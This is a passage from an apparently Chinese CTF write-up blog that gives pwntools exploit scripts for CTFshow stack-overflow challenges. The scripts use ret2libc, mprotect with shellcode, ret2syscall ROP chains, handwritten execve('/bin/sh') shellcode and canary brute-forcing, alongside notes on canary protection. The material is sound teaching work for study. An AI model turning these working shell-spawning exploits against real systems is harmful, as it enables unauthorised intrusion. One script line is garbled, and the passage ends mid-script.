<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn50&quot;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = 0x20 + 8</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rdi = 0x04007e3 #0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">ret = 0x04004fe #0x00000000004004fe : ret</span><br><span class="line"></span><br><span class="line">payload = cyclic(padding) + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.recvuntil(&quot;Hello CTFshow&quot;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak = p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">puts = u64(leak)</span><br><span class="line">print(hex(puts),repr(leak))</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = cyclic(padding) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">p.sendlineafter(&quot;Hello CTFshow&quot;,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>mprotect</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn50&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(elf.path)</span><br><span class="line"><span class="comment"># p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28127)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007e3</span></span><br><span class="line">bss_start_addr = <span class="number">0x601000</span></span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">0x100</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(ctfshow)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">leak_line = p.recvline().strip()    <span class="comment"># .strip():用于去除字符串（或字节串）首尾的空白字符（如换行符 \n、空格、制表符等）。</span></span><br><span class="line">leak_addr = u64(leak_line.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: mprotect(bss_start_addr, 0x1000, 7)</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(pop_rdi_ret) + p64(bss_start_addr) + p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x7</span>) + p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: gets(shellcode_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(pop_rdi_ret) + p64(shellcode_addr) + p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(she craft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: jump to shellcode</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>pwn51</h1>
<p>溢出原因</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">read(<span class="number">0</span>, s, <span class="number">0x20u</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    替换I给Ironman</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">strcpy</span>(s, v4);</span><br></pre></td></tr></table></figure>
<p>s达到0x6c溢出,在其中read我们的输入,如果我们输入16个I,会被替换成112个字符,正好填满s和EBP,接着就可以控制流了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn51&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28167)</span></span><br><span class="line">get_flag=<span class="number">0x804902E</span></span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span>*<span class="number">16</span>+p32(get_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn52</h1>
<p>这里溢出控制流简单,但是在flag函数会卡一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">876</span> &amp;&amp; a2 == <span class="number">877</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的a1为876并且a2为877才可print出flag,也就是说我们需要传参.参数在我们返回到flag函数之后直接打栈上就可以了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn52&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"><span class="comment"># p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28172)</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">a1 = <span class="number">0x36C</span></span><br><span class="line">a2 = <span class="number">0x36D</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(padding) + p32(flag) + p32(<span class="number">0</span>) + p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn53</h1>
<p>这道题模拟了canary保护,只不过这里的canary是静态的,可以通过爆破来拿到canary是什么.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">filename=<span class="string">&quot;./pwn53&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canary=b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for j in range(4):</span></span><br><span class="line"><span class="comment">#     for i in range(0xff):</span></span><br><span class="line"><span class="comment">#         p = remote(&quot;pwn.challenge.ctf.show&quot;,28112)</span></span><br><span class="line"><span class="comment">#         # p=process(filename)</span></span><br><span class="line"><span class="comment">#         p.sendline(str(-1))</span></span><br><span class="line"><span class="comment">#         payload=b&#x27;a&#x27;*0x20+canary+p8(i) #这里用p8()原因是p8()会发送不可见字符，如果用b&#x27;&#x27;的话我们只能发送可见字符</span></span><br><span class="line"><span class="comment">#         p.sendafter(b&#x27;$ &#x27;,payload) #不能用send，用了后面的ans里会是乱码，不知道为什么</span></span><br><span class="line"><span class="comment">#         ans=p.recv()</span></span><br><span class="line"><span class="comment">#         print(&#x27;ans----------&gt;&#x27;,ans)</span></span><br><span class="line"><span class="comment">#         if b&#x27;Canary Value Incorrect!&#x27;not in ans:</span></span><br><span class="line"><span class="comment">#             canary+=p8(i)</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             print(&quot;tryying...&quot;)</span></span><br><span class="line"><span class="comment">#             p.close()</span></span><br><span class="line"><span class="comment"># print(&#x27;cancry is &#x27;,canary)</span></span><br><span class="line">canary= <span class="string">b&#x27;36D!&#x27;</span> <span class="comment">#这里是我已经爆破出来了才写的</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28112</span>)</span><br><span class="line"><span class="comment"># p=process(filename)</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">flag_addr=<span class="number">0x8048696</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># payload=0x20*b&#x27;a&#x27;+canary+12*b&#x27;a&#x27;+p32(flag_addr)</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)+p32(flag_addr) <span class="comment">#这里填充完cannary之后应该填充12个字节，但是还要加4填充到ret地址</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">p.interactive()\</span><br></pre></td></tr></table></figure>
<h2 id="Canary保护原理">Canary保护原理</h2>
<p>Canary（栈保护金丝雀）是一种用于检测栈溢出攻击的防护机制，得名于矿工用金丝雀检测有毒气体的典故。其核心原理如下：</p>
<ol>
<li>
<p><strong>栈布局</strong>：在函数调用时，在栈帧的返回地址前插入一个随机值（canary）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| 局部变量 | canary | 保存的ebp | 返回地址 | 函数参数 |</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>随机性</strong>：程序启动时生成随机canary值，存储在TLS（线程局部存储）中</p>
</li>
<li>
<p><strong>验证机制</strong>：函数返回前检查canary值是否被修改，若被修改则终止程序</p>
</li>
<li>
<p><strong>实现方式</strong>：</p>
<ul>
<li>GCC中使用<code>-fstack-protector</code>（保护有数组的函数）或<code>-fstack-protector-all</code>（保护所有函数）</li>
<li>32位程序通常使用<code>gs:0x14</code>处的值作为canary</li>
<li>64位程序通常使用<code>fs:0x28</code>处的值作为canary</li>
</ul>
</li>
</ol>
<p>Canary在栈上的偏移位置：</p>
<ul>
<li><strong>32位程序</strong>：通常位于<code>ebp - 0xC</code>位置</li>
<li><strong>64位程序</strong>：通常位于<code>rbp - 0x8</code>位置</li>
</ul>
<h1>pwn78</h1>
<h2 id="ret2syscall">ret2syscall</h2>
<p>原理就是通过体统调用syscall来执行函数,只不过在调用不同的函数需要先将不同的值压入指定寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0068732f6e69622f</span><br><span class="line">0x68732f6e69622f</span><br><span class="line">hs/nib/</span><br><span class="line">其中的/可以多不可以少</span><br></pre></td></tr></table></figure>
<h2 id="系统调用">系统调用</h2>
<p>ROPgadget --binary 文件名 --only “pop|ret” | grep rdi</p>
<table>
<thead>
<tr>
<th><strong>架构</strong></th>
<th><strong>系统调用 / 函数</strong></th>
<th><strong>系统调用号存储寄存器</strong></th>
<th><strong>第一个参数存储寄存器</strong></th>
<th><strong>第二个参数存储寄存器</strong></th>
<th><strong>第三个参数存储寄存器</strong></th>
<th><strong>第四个参数存储寄存器</strong></th>
<th><strong>触发系统调用指令</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>x86 - 32</td>
<td>read</td>
<td>eax =3</td>
<td>ebx = 0</td>
<td>ecx = bss</td>
<td>edx = 0x100</td>
<td>-</td>
<td>int 0x80</td>
</tr>
<tr>
<td>x86 - 32</td>
<td>write</td>
<td>eax =4</td>
<td>ebx = 1</td>
<td>ecx = bss</td>
<td>edx = 0x100</td>
<td>-</td>
<td>int 0x80</td>
</tr>
<tr>
<td>x86 - 32</td>
<td>execve（system 底层依赖）</td>
<td>eax =11</td>
<td>ebx =&gt;binsh</td>
<td>ecx =0</td>
<td>edx = 0</td>
<td>-</td>
<td>int 0x80</td>
</tr>
<tr>
<td>x86 - 64</td>
<td>read</td>
<td>rax =0</td>
<td>rdi =0</td>
<td>rsi = bss</td>
<td>rdx = 0x100</td>
<td>-</td>
<td>syscall</td>
</tr>
<tr>
<td>x86 - 64</td>
<td>write</td>
<td>rax =1</td>
<td>rdi =1</td>
<td>rsi = bss</td>
<td>rdx =0x100</td>
<td>-</td>
<td>syscall</td>
</tr>
<tr>
<td>x86 - 64</td>
<td>execve（system 底层依赖）</td>
<td>rax =59</td>
<td>rdi =&gt;binsh</td>
<td>rsi =0</td>
<td>rdx = 0</td>
<td>-</td>
<td>syscall</td>
</tr>
</tbody>
</table>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn78&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">88</span></span><br><span class="line">rdx_rsi = <span class="number">0X04377f9</span></span><br><span class="line">rdi = <span class="number">0x004016c3</span></span><br><span class="line">rax = <span class="number">0x046b9f8</span></span><br><span class="line">ret = <span class="number">0x04002c9</span></span><br><span class="line">syscall = <span class="number">0x045BAC5</span></span><br><span class="line">bin_sh = <span class="number">0x00000000006C1EE8</span></span><br><span class="line"><span class="comment"># setp1_read</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p64(ret) + p64(rdx_rsi) + p64(<span class="number">0x100</span>) + p64(bin_sh) + p64(rdi) + p64(<span class="number">0</span>) + p64(rax) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2_system</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(bin_sh) + p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004002c9 : ret</span></span><br><span class="line"><span class="comment"># 0x000000000046b9f8 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004016c3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004377f9 : pop rdx ; pop rsi ; ret</span></span><br></pre></td></tr></table></figure>
<p>注意细节,这里的syscall需要用syscall ; ret否则rop链无法执行完</p>
<p>ROPgadget --binary 文件名 --only “pop|ret” | grep rdi如果无法找到syscall ; ret可以在ida里面找找看</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250504161158662.png" alt="image-20250504161158662"></p>
<h2 id="ret2syscall-2">ret2syscall</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x080481c9 : pop ebx ; ret</span></span><br><span class="line"><span class="comment"># 0x08049421 : int 0x80</span></span><br><span class="line"><span class="comment"># 0x080bb196 : pop eax ; ret</span></span><br><span class="line"><span class="comment"># 0x080481b2 : ret</span></span><br><span class="line"><span class="comment"># 0x0806eb6a : pop edx ; ret</span></span><br><span class="line"><span class="comment"># 0x0806eb91 : pop ecx ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./222&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">ebx_bin_sh = <span class="number">0x080BE408</span></span><br><span class="line">int_ret = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">eax_syscall = <span class="number">11</span></span><br><span class="line">ret = <span class="number">0x080481b2</span></span><br><span class="line">edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">payload = cyclic(padding) +p32(eax_ret) + p32(eax_syscall) + p32(ebx_ret) +p32(<span class="number">0</span>)+ p32(ebx_bin_sh) + p32(edx_ret) +p32(<span class="number">0</span>) + p32(int_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn58</h1>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250504211951005.png" alt="image-20250504211951005"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn58&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor ebx,ebx</span></span><br><span class="line"><span class="string">    push ebx</span></span><br><span class="line"><span class="string">    push 0x68732f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250504211643097.png" alt="image-20250504211643097"></p>
<h1>pwn59</h1>
<h2 id="shellcode">shellcode</h2>
<p>shellcode = asm(<a href="http://shellcraft.sh">shellcraft.sh</a>())</p>
<p>通过手写shellcode可以达到字节更加简短的效果</p>
<p><a href="https://xz.aliyun.com/news/13253">shellcode进阶之手写shellcode</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn59&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rcx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 59</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#mov rdi,rsp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn59&#x27;)</span></span><br><span class="line"><span class="comment"># # shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     lea rdi,[rsp+0x26]</span></span><br><span class="line"><span class="comment">#     xor edx,edx</span></span><br><span class="line"><span class="comment">#     xor esi,esi</span></span><br><span class="line"><span class="comment">#     push 59</span></span><br><span class="line"><span class="comment">#     pop rax</span></span><br><span class="line"><span class="comment">#     syscall</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.sendline(shellcode+b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment"># #mov rdi,rsp</span></span><br></pre></td></tr></table></figure>
<h1>pwn60</h1>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-pwn can u pwn me here!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;See you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gets(危险函数)读取我们的输入给s,然后通过strncpy将s复制给buf2.<br>
这里有一个问题<br>
我们18版本的Ubuntu的gdb看读写执行权限,发现buf2的地址有读写执行权限,而其他版本的Ubuntu不可以.打的时候也要用18版本Ubuntu</p>
<p>既然buf2有读写执行权限,那么我们将execve(“/bin/sh”)写进buf2,然后通过gets溢出,返回到buf2的地址即可.buf2的地址为0x0804A080</p>
<p>ida里的溢出也是错误的,<br>
通过gdb调试<br>
<img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250504215840447.png" alt="image-20250504215840447"></p>
<p>溢出为112</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn60&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">buf2_ar=elf.sym[<span class="string">&#x27;buf2&#x27;</span>]</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf2_ar)</span><br><span class="line">p.recvuntil(<span class="string">&quot;CTFshow-pwn can u pwn me here!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn61</h1>
<p>方法一:<br>
由于gets汇编后面有leave,所以这里不能在栈当中直接写shellcode,<a href="http://xn--shellcodeleave-3h8wy10arvnb40b4yl1u1x.xn--leaveshellcraft-126xp41n.sh">得把shellcode写在leave后面.leave会对shellcraft.sh</a>()产生影响<br>
所以<br>
构造padding到返回地址,返回地址上写返回地址的的下一个地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*padding + p64(v5addr + 24+8) + shellcode</span><br></pre></td></tr></table></figure>
<p>方法二(三):<br>
既然方法一当中说了,遇到leave就报错了,shellcode无法执行,那么我们用汇编写一个小一点的shellcode刚好到leave.</p>
<p>先给出所有正确的exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn61&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./pwn61&#x27;</span>,<span class="string">&#x27;b printf&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn61&#x27;)</span></span><br><span class="line">padding = <span class="number">16</span> + <span class="number">8</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    lea rdi,[rsp-0x12]</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 59</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">v5addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;]&quot;</span>,drop = <span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(v5addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v5addr))</span><br><span class="line">payload = shellcode+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">2</span> + p64(v5addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span 